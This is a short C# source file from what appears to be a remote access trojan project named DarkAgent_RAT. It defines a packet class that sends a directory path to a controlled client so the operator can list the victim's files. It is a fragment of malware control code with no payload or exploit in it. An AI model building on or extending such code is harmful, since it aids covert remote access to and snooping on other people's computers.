using System;
using System.Collections.Generic;
using System.Text;

namespace DarkAgent_RAT.src.Network.DataNetwork.Packets.Send
{
    public class S_FileMgrGetFiles : SendBasePacket
    {
        private string DirLocation;
        public S_FileMgrGetFiles(RatClients client, string DirLocation)
            : base(client)
        {
            this.DirLocation = DirLocation;
        }
        protected internal override void Write()
        {
            WriteByte(0x0013);
            WriteString(DirLocation);
        }
    }
}
